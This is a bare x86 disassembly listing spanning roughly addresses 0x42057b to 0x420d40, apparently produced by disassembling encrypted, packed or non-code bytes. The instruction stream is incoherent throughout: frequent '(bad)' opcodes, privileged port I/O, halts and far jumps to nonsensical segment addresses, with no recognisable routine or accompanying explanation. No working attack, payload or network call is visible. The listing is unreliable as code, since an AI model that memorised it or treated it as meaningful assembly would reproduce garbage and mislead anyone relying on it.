  42057b:	mov    dh,0x9e
  42057d:	xchg   esi,eax
  42057e:	push   0xffffffd4
  420580:	mov    eax,ds:0x666ce39
  420585:	push   DWORD PTR [esi]
  420587:	add    eax,0x9536f71f
  42058c:	xchg   DWORD PTR [ebx+0x35e7e03c],esi
  420592:	test   ah,dl
  420594:	push   ebx
  420595:	pushf  
  420596:	je     0x4205d4
  420598:	sbb    al,0x5d
  42059a:	pop    ebp
  42059b:	repnz fdivr st(6),st
  42059e:	enter  0xf5d7,0x51
  4205a2:	cmp    DWORD PTR ds:[edx],ebx
  4205a5:	adc    cl,BYTE PTR [eax]
  4205a7:	mov    bh,0xd4
  4205a9:	inc    eax
  4205aa:	out    dx,eax
  4205ab:	or     eax,0x746e5839
  4205b0:	pop    edx
  4205b1:	cmp    DWORD PTR [ebx-0x676884c8],0xeb80939d
  4205bb:	push   edx
  4205bc:	ins    BYTE PTR es:[edi],dx
  4205bd:	xor    esi,DWORD PTR [esi]
  4205bf:	jp     0x4205d8
  4205c1:	test   BYTE PTR [ebx],0x85
  4205c4:	inc    eax
  4205c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205c6:	pop    edx
  4205c7:	jge    0x42057d
  4205c9:	sbb    eax,0xb6ab3950
  4205ce:	push   edx
  4205cf:	mov    cl,0xca
  4205d1:	mov    ah,0x33
  4205d3:	pop    ebp
  4205d4:	stc    
  4205d5:	es push es
  4205d7:	sti    
  4205d8:	jg     0x42064f
  4205da:	pop    es
  4205db:	cld    
  4205dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205dd:	mov    bl,0x10
  4205df:	mov    ss,WORD PTR gs:[edi-0x32]
  4205e3:	mov    edi,DWORD PTR [edx-0x5806ea66]
  4205e9:	mov    DWORD PTR [ecx+0x40c6d85a],esi
  4205ef:	shr    DWORD PTR [edx+esi*2+0x71],0x1
  4205f4:	scas   eax,DWORD PTR es:[edi]
  4205f5:	inc    edi
  4205f6:	and    ebp,DWORD PTR [edx+0x6e]
  4205f9:	mov    ebp,0x455ddada
  4205fe:	jns    0x4205c6
  420600:	ret    0xb518
  420603:	(bad)  
  420604:	jno    0x420661
  420606:	or     al,0x53
  420608:	stc    
  420609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42060a:	xor    BYTE PTR [ebx],0x95
  42060d:	loope  0x42061e
  42060f:	stos   BYTE PTR es:[edi],al
  420610:	or     dl,BYTE PTR [esi]
  420612:	mov    edi,DWORD PTR [edx+ebx*8-0x6a8549dc]
  420619:	jmp    0x41f744a
  42061e:	cmp    al,0xe2
  420620:	mov    esi,0x56409666
  420625:	cs or  al,0x32
  420628:	add    al,0x23
  42062a:	adc    DWORD PTR [eax],esi
  42062c:	les    ebp,FWORD PTR [edx+edx*4]
  42062f:	add    eax,0x40e7aa4a
  420634:	retf   
  420635:	xor    DWORD PTR [esp+edi*1+0x26b4fb63],esp
  42063c:	imul   ecx,DWORD PTR [ebp+0x21],0xffffffd4
  420640:	mov    ebx,0x5763418a
  420645:	pusha  
  420646:	inc    edx
  420647:	xor    al,0x1e
  420649:	xor    ch,BYTE PTR [ebp-0x777773d0]
  42064f:	sbb    BYTE PTR [edx],dl
  420651:	xor    BYTE PTR [ebx],0xe5
  420654:	out    dx,al
  420655:	aad    0xc1
  420657:	cs enter 0xbe76,0x4d
  42065c:	(bad)  
  42065d:	cmc    
  42065e:	ficom  WORD PTR ds:0x665e024b
  420664:	mov    ds:0xd4ab8f8c,al
  420669:	leave  
  42066a:	push   ebp
  42066b:	or     esp,DWORD PTR [edi]
  42066d:	sub    eax,0x3d10038d
  420672:	xor    al,0xe7
  420674:	jl     0x4206c6
  420676:	mov    edx,0x93911734
  42067b:	ds (bad) 
  42067d:	cmp    bl,BYTE PTR [ecx-0xf19f891]
  420683:	sub    edx,ebp
  420685:	imul   edx,edx,0x40
  420688:	mov    fs,WORD PTR ds:0xcee214ca
  42068e:	or     DWORD PTR [edi-0x588d3503],ecx
  420694:	push   es
  420695:	xchg   ecx,eax
  420696:	cdq    
  420697:	jne    0x420710
  420699:	in     al,0x68
  42069b:	or     DWORD PTR [ebp+0x5c2593f2],esi
  4206a1:	dec    esp
  4206a2:	ficomp DWORD PTR [ebp+0x4f]
  4206a5:	pop    esi
  4206a6:	test   eax,0x61be9aae
  4206ab:	cmp    esp,ebp
  4206ad:	mov    eax,0x3cecc80a
  4206b2:	lods   eax,DWORD PTR ds:[esi]
  4206b3:	xchg   edi,eax
  4206b4:	fs or  al,ch
  4206b7:	popf   
  4206b8:	cli    
  4206b9:	pop    esi
  4206ba:	das    
  4206bb:	mov    ds:0xf0965648,al
  4206c0:	xor    BYTE PTR [ecx-0x37],0xcb
  4206c4:	(bad)  
  4206c5:	lods   al,BYTE PTR ds:[esi]
  4206c6:	cmp    eax,0xdcc420e
  4206cb:	mov    ch,0xa4
  4206cd:	and    al,0x91
  4206cf:	add    eax,0x70f47942
  4206d4:	sub    DWORD PTR [edi-0x7060b277],ebx
  4206da:	jns    0x4206c4
  4206dc:	mov    edi,0xf4877a7
  4206e1:	cld    
  4206e2:	mov    esi,DWORD PTR [ebx-0x5f47c4dd]
  4206e8:	mov    edi,0x7f8590b4
  4206ed:	push   0x4b1514bf
  4206f2:	fs (bad) 
  4206f4:	int3   
  4206f5:	cmp    al,0xbc
  4206f7:	mov    DWORD PTR [edx+ebp*8+0x1a],0xdc7d250b
  4206ff:	repnz sahf 
  420701:	pop    ebx
  420702:	xor    ah,BYTE PTR ss:[edi+0x2b]
  420706:	scas   ax,WORD PTR es:[edi]
  420708:	inc    edx
  420709:	xchg   ecx,eax
  42070a:	paddq  mm4,QWORD PTR [esp+ecx*8+0x35c8276b]
  420712:	jbe    0x4206ca
  420714:	xchg   esi,eax
  420715:	xor    DWORD PTR [edx-0x12aa15d9],edi
  42071b:	jge    0x4206e8
  42071d:	les    ecx,FWORD PTR [ecx-0x5f]
  420720:	(bad)  
  420722:	xchg   esi,eax
  420723:	jnp    0x4206cf
  420725:	jne    0x42078b
  420727:	jp     0x420728
  420729:	push   esp
  42072a:	xchg   DWORD PTR [ebx],eax
  42072c:	in     eax,dx
  42072d:	sahf   
  42072e:	and    DWORD PTR [ebx-0x6f958a5e],ecx
  420734:	leave  
  420735:	add    DWORD PTR [ecx+0x33],0x6c440e55
  42073c:	jmp    0xae2cb143
  420741:	xor    dh,BYTE PTR ds:0x854e923b
  420747:	imul   ecx,DWORD PTR [esi],0xffffff96
  42074a:	mov    ecx,0x1fa5554b
  42074f:	call   0x7ae442d4
  420754:	mov    gs,WORD PTR [ecx+0x78]
  420757:	ins    DWORD PTR es:[edi],dx
  420758:	mov    DWORD PTR [eax-0x22],eax
  42075b:	xor    ah,BYTE PTR [ecx+0x7e]
  42075e:	push   cs
  42075f:	xchg   edi,edi
  420761:	mov    DWORD PTR [eax+0x72],0x68ba84a6
  420768:	jmp    0x76ac9435
  42076d:	and    DWORD PTR [ebx+0x5fd1c7de],eax
  420773:	pusha  
  420774:	repz sbb DWORD PTR [esi+0x16],ecx
  420778:	fwait
  420779:	and    eax,0x717f9fad
  42077e:	adc    dl,BYTE PTR [eax+0x56]
  420781:	retf   0x2656
  420784:	push   esp
  420785:	pop    edi
  420786:	adc    dh,BYTE PTR [eax-0x8]
  420789:	or     ch,BYTE PTR [eax+edi*8+0x4d]
  42078d:	fstp   st(4)
  42078f:	pusha  
  420790:	inc    ebp
  420791:	add    BYTE PTR [edi-0x1c1f67e0],dl
  420797:	ss mov al,0x9a
  42079a:	xor    DWORD PTR [ebp-0x78],ebp
  42079d:	cmc    
  42079e:	shl    BYTE PTR [ecx+0x4202e2a5],cl
  4207a4:	pusha  
  4207a5:	xchg   BYTE PTR [edx+0x5a45a746],al
  4207ab:	(bad)  
  4207ac:	scas   eax,DWORD PTR es:[edi]
  4207ad:	mov    bl,0xbd
  4207af:	inc    esi
  4207b0:	sti    
  4207b1:	ss arpl dx,cx
  4207b4:	sub    ch,dl
  4207b6:	das    
  4207b7:	(bad)  
  4207b8:	push   ecx
  4207b9:	or     DWORD PTR [ebp+0x41],esp
  4207bc:	push   0x9088a9c8
  4207c1:	inc    ecx
  4207c2:	loopne 0x42082a
  4207c4:	enter  0xe4ec,0x1
  4207c8:	mov    ebx,0x6b55ab21
  4207cd:	retf   0xa15b
  4207d0:	pusha  
  4207d1:	mov    edx,0xed6ccf75
  4207d6:	icebp  
  4207d7:	mov    ds:0x75977523,eax
  4207dc:	fdivp  st(0),st
  4207de:	cmp    ecx,DWORD PTR [eax]
  4207e0:	fs and ch,bl
  4207e3:	xor    eax,0xe5ad7def
  4207e8:	and    ch,BYTE PTR [edx+0x63]
  4207eb:	mov    edi,0xf0e6bf4e
  4207f0:	std    
  4207f1:	call   FWORD PTR [ecx-0x11]
  4207f4:	push   ds
  4207f5:	and    bh,cl
  4207f7:	dec    edi
  4207f8:	inc    ebx
  4207f9:	pop    ds
  4207fa:	mov    eax,ds:0x1e396027
  4207ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420800:	and    esp,0x30
  420803:	jmp    0x6e3b3b03
  420808:	sbb    BYTE PTR [esi],ah
  42080a:	das    
  42080b:	cmp    BYTE PTR ds:0x10348e18,0x94
  420812:	into   
  420813:	jp     0x420872
  420815:	dec    esi
  420816:	test   eax,0x59cb7b60
  42081b:	fsub   DWORD PTR [esi]
  42081d:	mov    ecx,0x38c5a57d
  420822:	xor    edx,DWORD PTR [edi]
  420824:	jne    0x42089c
  420826:	dec    edi
  420827:	pop    es
  420828:	sub    BYTE PTR [eax-0x53631ede],cl
  42082e:	mov    es,edx
  420830:	sbb    edx,DWORD PTR [ecx+0xc]
  420833:	jns    0x4207e3
  420835:	ds fwait
  420837:	and    eax,0x28f49a52
  42083c:	sub    BYTE PTR [eax+0x2d],ch
  42083f:	xchg   DWORD PTR ds:0x39e6d831,edi
  420845:	or     al,0x7f
  420847:	mov    al,ah
  420849:	cmp    dl,BYTE PTR [edx-0x2]
  42084c:	dec    edi
  42084d:	ins    DWORD PTR es:[edi],dx
  42084e:	push   esi
  42084f:	push   ds
  420850:	and    al,dl
  420852:	das    
  420853:	leave  
  420854:	xor    al,0x44
  420856:	jne    0x4207fb
  420858:	xchg   BYTE PTR [eax-0x3c],ch
  42085b:	push   ds
  42085c:	test   eax,0xaaed23ea
  420861:	ficomp WORD PTR [esi+ecx*8]
  420864:	shl    BYTE PTR [esi-0x6e468262],cl
  42086a:	loope  0x42084e
  42086c:	jb     0x420820
  42086e:	xor    BYTE PTR [esi+0x6],ah
  420871:	pop    ss
  420872:	lock xor eax,0xd937b758
  420878:	cmp    esp,edi
  42087a:	cmp    eax,0xacd71ac8
  42087f:	push   es
  420880:	scas   al,BYTE PTR es:[edi]
  420881:	mov    esp,0x135627c7
  420886:	lea    edx,fs:[eax+0x38031d03]
  42088d:	or     al,0xf9
  42088f:	jg     0x420841
  420891:	lock pop ecx
  420893:	call   0x36be6a96
  420898:	xlat   BYTE PTR ds:[ebx]
  420899:	mov    edi,fs
  42089b:	aam    0xc6
  42089d:	ror    BYTE PTR ds:0xd580ce63,cl
  4208a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208a4:	mov    ds:0x246f36ba,al
  4208a9:	loop   0x4208c6
  4208ab:	fild   QWORD PTR [edi-0x54d99a5f]
  4208b1:	mov    al,ds:0xc6ca9e23
  4208b6:	and    al,0x6d
  4208b8:	pop    es
  4208b9:	xor    BYTE PTR ss:0xa2855fc3,bl
  4208c0:	and    eax,0x1a2aeb33
  4208c5:	dec    edi
  4208c6:	add    al,0x9f
  4208c8:	and    BYTE PTR [esp+eiz*2+0x4a5ed05f],bh
  4208cf:	test   BYTE PTR [eax-0x6b],dl
  4208d2:	or     al,0xc7
  4208d4:	mov    dl,0xaa
  4208d6:	leave  
  4208d7:	test   DWORD PTR [edi+0x53f3bf4a],edx
  4208dd:	in     eax,0x88
  4208df:	and    al,al
  4208e1:	fadd   DWORD PTR [ecx+0x2aab12e0]
  4208e7:	cli    
  4208e8:	out    dx,al
  4208e9:	sub    bl,bl
  4208eb:	mov    cl,0xa4
  4208ed:	pushf  
  4208ee:	out    0x96,eax
  4208f0:	rcl    BYTE PTR [edi],cl
  4208f2:	push   eax
  4208f3:	cmp    BYTE PTR [ecx],bl
  4208f5:	pop    edi
  4208f6:	ds cmp eax,0x2f41fbf5
  4208fc:	xchg   ecx,eax
  4208fd:	std    
  4208fe:	scas   eax,DWORD PTR es:[edi]
  4208ff:	mov    esi,0x684492f9
  420904:	ret    0x47ed
  420907:	scas   al,BYTE PTR es:[edi]
  420908:	mov    esp,0x4a7bdf9
  42090d:	inc    ebp
  42090e:	int    0x8e
  420910:	popa   
  420911:	fdivr  st,st(5)
  420913:	(bad)  
  420914:	mov    dh,0x96
  420916:	add    edi,ebx
  420918:	mov    ecx,0xa5413d0b
  42091d:	in     al,0xb0
  42091f:	push   esi
  420920:	test   DWORD PTR [ebp-0x34],ecx
  420923:	scas   al,BYTE PTR es:[edi]
  420924:	push   ebx
  420925:	in     eax,dx
  420926:	out    0x5a,al
  420928:	add    bh,ah
  42092a:	sub    DWORD PTR [ebx],edi
  42092c:	inc    edi
  42092d:	scas   al,BYTE PTR es:[edi]
  42092e:	outs   dx,DWORD PTR ds:[esi]
  42092f:	fadd   QWORD PTR [edx+0x2b]
  420932:	stos   BYTE PTR es:[edi],al
  420933:	or     DWORD PTR [esi],esi
  420935:	push   cs
  420936:	dec    eax
  420937:	fscale 
  420939:	push   esp
  42093a:	test   eax,0x6a3f9126
  42093f:	and    al,0x8b
  420941:	cmp    BYTE PTR [eax+0xc1c6e35],al
  420947:	fistp  DWORD PTR [ecx]
  420949:	pop    eax
  42094a:	es inc eax
  42094c:	jg     0x420974
  42094e:	in     al,dx
  42094f:	sbb    al,BYTE PTR [esi]
  420951:	pop    ecx
  420952:	inc    eax
  420953:	push   ebp
  420954:	fsubr  QWORD PTR [ebx+0x56698a88]
  42095a:	mov    BYTE PTR [eax+esi*1-0x13],al
  42095e:	(bad)  
  42095f:	jb     0x4209da
  420961:	stos   DWORD PTR es:[edi],eax
  420962:	fisub  DWORD PTR [ecx]
  420964:	ret    0x36c3
  420967:	inc    ebp
  420968:	adc    eax,0xd34c876
  42096d:	clc    
  42096e:	jb     0x420973
  420970:	inc    ebp
  420971:	adc    al,0x1a
  420973:	inc    esi
  420974:	pop    ss
  420975:	dec    eax
  420976:	or     al,0x6e
  420978:	dec    esi
  420979:	fsub   QWORD PTR [eax-0x7d19ff4b]
  42097f:	call   0x2cc3815b
  420984:	pop    es
  420985:	inc    ebx
  420986:	sbb    bh,BYTE PTR [eax+0xb9f49b5]
  42098c:	add    DWORD PTR [edi+0x23ab8f60],ebp
  420992:	int    0x3b
  420994:	stos   DWORD PTR es:[edi],eax
  420995:	jns    0x420917
  420997:	loop   0x4209d3
  420999:	stos   BYTE PTR es:[edi],al
  42099a:	jmp    0xf9e8:0xa6b8da9d
  4209a1:	and    al,0x1b
  4209a3:	xchg   ebx,eax
  4209a4:	sub    esp,DWORD PTR fs:[ebp-0x6d]
  4209a8:	mov    BYTE PTR [eax],ch
  4209aa:	add    DWORD PTR [edi],ebp
  4209ac:	outs   dx,DWORD PTR ds:[esi]
  4209ad:	ja     0x420934
  4209af:	cli    
  4209b0:	or     DWORD PTR [ecx+0x7dcbab24],edi
  4209b6:	frstor [edi+ebx*1-0x33]
  4209ba:	sub    al,0x26
  4209bc:	xor    edi,esi
  4209be:	stos   BYTE PTR es:[edi],al
  4209bf:	adc    dh,BYTE PTR [esp+edi*4]
  4209c2:	pop    eax
  4209c3:	ja     0xd2b3c2a9
  4209c9:	adc    ch,al
  4209cb:	mov    cl,0x3d
  4209cd:	hlt    
  4209ce:	cmp    esp,esi
  4209d0:	fistp  DWORD PTR [eax-0x50]
  4209d3:	mov    eax,ds:0xed29d7c4
  4209d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209d9:	jg     0x4209b8
  4209db:	adc    BYTE PTR [eax],bl
  4209dd:	xchg   BYTE PTR [edx+0x2f],cl
  4209e0:	ja     0x4209a0
  4209e2:	jecxz  0x420a46
  4209e4:	mov    al,0xdd
  4209e6:	scas   al,BYTE PTR es:[edi]
  4209e7:	mov    ebx,0x4bf76492
  4209ec:	dec    edi
  4209ed:	leave  
  4209ee:	aas    
  4209ef:	(bad)  
  4209f0:	fsubr  DWORD PTR [edi]
  4209f2:	inc    edi
  4209f3:	push   esi
  4209f4:	lea    ebx,[esi-0x72]
  4209f7:	js     0x4209c3
  4209f9:	push   0xffffffc0
  4209fb:	pop    edx
  4209fc:	xor    BYTE PTR [esi+0x32],0xa2
  420a00:	or     esp,DWORD PTR [ecx+0xe32ba2d]
  420a06:	shr    DWORD PTR [ebp+0x738b6c99],cl
  420a0c:	mov    ah,0x5d
  420a0e:	jmp    0xf5d53e01
  420a13:	cli    
  420a14:	inc    edi
  420a15:	stos   DWORD PTR es:[edi],eax
  420a16:	mov    gs:0x6d09d592,eax
  420a1c:	or     ah,BYTE PTR [esi-0x67]
  420a1f:	mov    dl,0x5e
  420a21:	leave  
  420a22:	sbb    DWORD PTR [edx-0x53],eax
  420a25:	fild   WORD PTR [eax+ebx*8-0x15def6ed]
  420a2c:	icebp  
  420a2d:	xor    DWORD PTR [esi],ecx
  420a2f:	push   eax
  420a30:	and    al,0x5c
  420a32:	xchg   BYTE PTR [ebx+0x7b57d3d9],cl
  420a38:	sub    al,0x97
  420a3a:	xchg   DWORD PTR [ecx],edi
  420a3c:	retf   0xf9c2
  420a3f:	scas   al,BYTE PTR es:[edi]
  420a40:	mov    bl,0xb2
  420a42:	ins    DWORD PTR es:[edi],dx
  420a43:	scas   eax,DWORD PTR es:[edi]
  420a44:	mov    edi,ebx
  420a46:	stos   DWORD PTR es:[edi],eax
  420a47:	dec    esi
  420a48:	fs movs BYTE PTR es:[edi],BYTE PTR cs:[esi]
  420a4b:	iret   
  420a4c:	mov    eax,0x763a2ee
  420a51:	sar    BYTE PTR [edi+esi*8+0x17],1
  420a55:	ret    0xe2bf
  420a58:	sahf   
  420a59:	xor    DWORD PTR [edi-0x3b],esp
  420a5c:	push   es
  420a5d:	cmp    BYTE PTR [ebp+ebx*4-0x47],ch
  420a61:	xor    eax,0xeb244d74
  420a66:	sub    eax,0x9034d524
  420a6b:	sub    DWORD PTR [ecx],ebp
  420a6d:	sahf   
  420a6e:	fwait
  420a6f:	xchg   BYTE PTR [edx-0x27],ah
  420a72:	sar    DWORD PTR [edi+0x3c9d25ff],cl
  420a78:	lods   al,BYTE PTR ds:[esi]
  420a79:	cld    
  420a7a:	mov    cl,ch
  420a7c:	repnz (bad) 
  420a7e:	jae    0x420afb
  420a80:	add    ebx,edx
  420a82:	xchg   esp,eax
  420a83:	and    DWORD PTR [esi],edi
  420a85:	call   0x4713f7e
  420a8a:	mov    edx,0x4703f43f
  420a8f:	(bad)  
  420a90:	mov    ebx,0xaeb0a3e3
  420a95:	inc    ebx
  420a96:	cli    
  420a97:	mov    bh,BYTE PTR [edi+0x2765a7df]
  420a9d:	add    ah,BYTE PTR [ecx+esi*4+0xe]
  420aa1:	sub    ebp,DWORD PTR [ebx+0x3c]
  420aa4:	aad    0x2a
  420aa6:	fisttp QWORD PTR [esi-0x390e5fd5]
  420aac:	jns    0x420b14
  420aae:	stc    
  420aaf:	jg     0x420b0e
  420ab1:	dec    eax
  420ab2:	jae    0x420b2d
  420ab4:	imul   eax,DWORD PTR [eax],0x993df855
  420aba:	mov    ch,0x9f
  420abc:	ins    BYTE PTR es:[edi],dx
  420abd:	dec    ecx
  420abe:	nop
  420abf:	and    cl,BYTE PTR [esi]
  420ac1:	out    dx,al
  420ac2:	push   esp
  420ac3:	loopne 0x420aaa
  420ac5:	in     al,0xb1
  420ac7:	xor    BYTE PTR [esi+0x26],0x87
  420acb:	jmp    0x5b65d114
  420ad0:	cmp    dh,BYTE PTR [edx+0x438db071]
  420ad6:	fwait
  420ad7:	jno    0x420a8c
  420ad9:	test   DWORD PTR [ebx],ebx
  420adb:	sub    BYTE PTR [eax-0x3c],cl
  420ade:	popa   
  420adf:	and    al,0x2f
  420ae1:	jl     0x420af5
  420ae3:	(bad)  
  420ae4:	sub    eax,0x690f96e9
  420ae9:	or     al,0x0
  420aeb:	xchg   edi,eax
  420aec:	(bad)  
  420aed:	fcom   DWORD PTR [ebx-0x21]
  420af0:	in     eax,0x4e
  420af2:	add    DWORD PTR [ecx],esi
  420af4:	dec    DWORD PTR [edx]
  420af6:	cs loopne 0x420b1a
  420af9:	adc    edi,DWORD PTR [edi+0x5d]
  420afc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420afd:	ja     0x420b29
  420aff:	xchg   ah,bh
  420b01:	cli    
  420b02:	fnstenv [edx]
  420b04:	inc    ebp
  420b05:	out    dx,al
  420b06:	pop    ds
  420b07:	(bad)  
  420b08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b09:	inc    ebx
  420b0a:	mov    dl,0x15
  420b0c:	xor    BYTE PTR [eax-0x53],bh
  420b0f:	fmul   st,st(0)
  420b11:	test   eax,0xd76bea3c
  420b16:	push   esp
  420b17:	inc    ebx
  420b18:	xchg   esp,eax
  420b19:	leave  
  420b1a:	add    eax,0xb8351111
  420b1f:	cdq    
  420b20:	inc    ebp
  420b21:	adc    dl,BYTE PTR [ebx]
  420b23:	shl    DWORD PTR [ecx-0x74],1
  420b26:	sti    
  420b27:	pop    esi
  420b28:	mov    ebx,0xd9643e05
  420b2d:	mov    dl,0x90
  420b2f:	(bad)  
  420b31:	out    dx,al
  420b32:	lods   eax,DWORD PTR ds:[esi]
  420b33:	pop    ds
  420b34:	jmp    0x426e:0x7e1d1572
  420b3b:	popf   
  420b3c:	or     al,0x65
  420b3e:	sti    
  420b3f:	ror    DWORD PTR [ebx-0x4e2236e6],1
  420b45:	sar    DWORD PTR [ebp-0x71577a72],1
  420b4b:	enter  0xe9ea,0xe9
  420b4f:	out    0x3a,eax
  420b51:	sbb    eax,0x9ba6af4d
  420b56:	push   esi
  420b57:	or     al,0xdf
  420b59:	sub    esp,DWORD PTR [ebp-0x67]
  420b5c:	adc    ebx,ecx
  420b5e:	push   cs
  420b5f:	jmp    0x1bc:0xbd7b1148
  420b66:	xchg   ebp,eax
  420b67:	fst    DWORD PTR [eax]
  420b69:	push   0x43
  420b6b:	mov    bh,0xb3
  420b6d:	int3   
  420b6e:	push   0x85056d16
  420b73:	popf   
  420b74:	add    dl,BYTE PTR [esp+0xa]
  420b78:	and    ah,dl
  420b7a:	(bad)  
  420b7b:	cli    
  420b7c:	adc    BYTE PTR [ebx-0x3c],ch
  420b7f:	jae    0x420b1a
  420b81:	test   BYTE PTR [esi-0x43],dh
  420b84:	and    eax,0x147c3582
  420b89:	add    BYTE PTR [ebx],cl
  420b8b:	jmp    0x420b5c
  420b8d:	js     0x420bea
  420b8f:	std    
  420b90:	push   es
  420b91:	imul   eax,DWORD PTR [eax-0x65239232],0xffffffc5
  420b98:	call   0xb5b5ef67
  420b9d:	rcr    esi,0xb
  420ba0:	mov    al,ds:0x9703a2ae
  420ba5:	xchg   ebx,eax
  420ba6:	mov    BYTE PTR [edx+0x6b8c4883],bl
  420bac:	jnp    0x420c11
  420bae:	xor    bl,0x16
  420bb1:	(bad)  
  420bb2:	push   ds
  420bb3:	test   al,0xc6
  420bb5:	pop    esp
  420bb6:	mov    ebp,0xfd38c57c
  420bbb:	dec    eax
  420bbc:	and    eax,0x211dc0f0
  420bc1:	xor    cl,BYTE PTR [edx+0x38]
  420bc4:	add    ah,BYTE PTR [eax+0x5a4fc0bb]
  420bca:	daa    
  420bcb:	mov    ah,0x9e
  420bcd:	adc    al,0x59
  420bcf:	gs cdq 
  420bd1:	jne    0x420b9f
  420bd3:	mov    edi,0x318a4908
  420bd8:	sbb    al,0xef
  420bda:	rcr    BYTE PTR [edi+0x27],1
  420bdd:	pop    edx
  420bde:	push   es
  420bdf:	push   ebx
  420be0:	pusha  
  420be1:	scas   eax,DWORD PTR es:[edi]
  420be2:	out    dx,eax
  420be3:	mov    ebp,DWORD PTR [eax+ebp*8]
  420be6:	(bad)  
  420be7:	push   ss
  420be8:	cmp    eax,edx
  420bea:	xor    ebp,DWORD PTR [edx-0x70]
  420bed:	popa   
  420bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bef:	xchg   ecx,eax
  420bf0:	dec    edx
  420bf1:	fwait
  420bf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bf3:	xchg   esi,eax
  420bf4:	or     bl,dh
  420bf6:	sahf   
  420bf7:	dec    edi
  420bf8:	out    dx,eax
  420bf9:	cli    
  420bfa:	sub    ebp,ecx
  420bfc:	push   0xba99f651
  420c01:	or     al,0xff
  420c03:	(bad)  
  420c04:	jne    0x420baf
  420c06:	hlt    
  420c07:	jmp    0xba3:0x4be77317
  420c0e:	popf   
  420c0f:	adc    DWORD PTR [eax+0x1a],edi
  420c12:	mov    DWORD PTR [ecx-0x2],edx
  420c15:	push   0x7f
  420c17:	ds daa 
  420c19:	(bad)  
  420c1a:	icebp  
  420c1b:	enter  0x7961,0x95
  420c1f:	aad    0xfd
  420c21:	or     DWORD PTR [ebp+0x15],ebp
  420c24:	neg    bh
  420c26:	push   0xffffff89
  420c28:	and    ax,0xfac0
  420c2c:	jg     0x420bdb
  420c2e:	out    0x8b,al
  420c30:	scas   al,BYTE PTR es:[edi]
  420c31:	push   cs
  420c32:	imul   BYTE PTR [ebx]
  420c34:	jb     0x420bf5
  420c36:	push   esi
  420c37:	aam    0xb2
  420c39:	bound  ebp,QWORD PTR [esi-0xdaec499]
  420c3f:	xor    al,0x58
  420c41:	mov    eax,ds:0x8ec7f3ae
  420c46:	call   0xc385:0xe75cb248
  420c4d:	inc    ecx
  420c4e:	iret   
  420c4f:	aad    0x46
  420c51:	xor    al,0x3
  420c53:	pop    ebp
  420c54:	jmp    0xa016:0x4d9c6d4
  420c5b:	inc    eax
  420c5c:	adc    BYTE PTR [ecx+0x496c0ceb],dl
  420c62:	sbb    al,0xa6
  420c64:	and    ch,0x67
  420c67:	fisub  WORD PTR [ebp-0x37d3db2a]
  420c6d:	xlat   BYTE PTR ds:[ebx]
  420c6e:	scas   eax,DWORD PTR es:[edi]
  420c6f:	cdq    
  420c70:	inc    esi
  420c71:	push   0x1ca3fed7
  420c76:	iret   
  420c77:	push   edi
  420c78:	mov    ah,0xc
  420c7a:	mov    al,ds:0xfea00153
  420c7f:	cld    
  420c80:	hlt    
  420c81:	pop    ebp
  420c82:	ficomp WORD PTR [ebx+eax*2+0x6]
  420c86:	(bad)  
  420c87:	pushf  
  420c88:	out    dx,al
  420c89:	sub    BYTE PTR [eax],0x7
  420c8c:	or     BYTE PTR [edx],0xc6
  420c8f:	push   edi
  420c90:	jno    0x420c65
  420c92:	sbb    eax,0x8f189d5d
  420c97:	pusha  
  420c98:	int3   
  420c99:	pusha  
  420c9a:	inc    eax
  420c9b:	adc    DWORD PTR [ecx+0x2ddefdc2],ecx
  420ca1:	xlat   BYTE PTR ds:[ebx]
  420ca2:	xor    eax,0xf69db329
  420ca7:	es retf 0x8ea
  420cab:	loop   0x420d16
  420cad:	inc    eax
  420cae:	iret   
  420caf:	cs add al,0x26
  420cb2:	test   DWORD PTR [eax],eax
  420cb4:	stos   DWORD PTR es:[edi],eax
  420cb5:	or     al,0x61
  420cb7:	mov    edi,0x7dce517d
  420cbc:	sar    BYTE PTR ds:0x12bb4a91,1
  420cc2:	sbb    eax,0x596c5ff6
  420cc7:	push   esi
  420cc8:	dec    ebx
  420cc9:	xrelease xchg BYTE PTR [edi],al
  420ccc:	push   ebp
  420ccd:	stc    
  420cce:	jns    0x420cd0
  420cd0:	lods   eax,DWORD PTR ds:[esi]
  420cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cd2:	inc    edi
  420cd3:	ror    BYTE PTR ds:0xf76f444e,0x88
  420cda:	mov    dh,0x3a
  420cdc:	mov    WORD PTR [ebx],ss
  420cde:	xor    al,0x97
  420ce0:	loopne 0x420cee
  420ce2:	ins    DWORD PTR es:[edi],dx
  420ce3:	mov    esi,0x672a25af
  420ce8:	mov    edx,0xb98360be
  420ced:	jo     0x420c7b
  420cef:	pop    eax
  420cf0:	aas    
  420cf1:	inc    eax
  420cf2:	mov    dh,0xa1
  420cf4:	cld    
  420cf5:	popa   
  420cf6:	adc    dh,cl
  420cf8:	and    eax,eax
  420cfa:	mov    bl,0xb1
  420cfc:	or     al,0x38
  420cfe:	add    cl,bl
  420d00:	push   cs
  420d01:	xchg   edi,eax
  420d02:	rcl    edx,cl
  420d04:	cmp    eax,0x8dfba366
  420d09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d0a:	ror    DWORD PTR [edx+eiz*1],0xec
  420d0e:	and    DWORD PTR [edi-0x7a09079c],ebx
  420d14:	cmp    BYTE PTR [ecx],ch
  420d16:	sbb    cl,BYTE PTR [edi-0x1b]
  420d19:	out    dx,eax
  420d1a:	mov    eax,0xce072a6a
  420d1f:	xchg   edx,eax
  420d20:	sub    DWORD PTR [eax-0x14],edi
  420d23:	mov    eax,ds:0x503d92ca
  420d28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d29:	adc    eax,0x84231647
  420d2e:	(bad)  
  420d30:	xor    al,ah
  420d32:	or     DWORD PTR [ecx+0x6b],0xcda420c0
  420d39:	jno    0x420d7d
  420d3b:	int    0x17
  420d3d:	fs pop ds
  420d3f:	push   eax
  420d40:	les    eax,FWORD PTR [ecx+0x6ad14d5d]
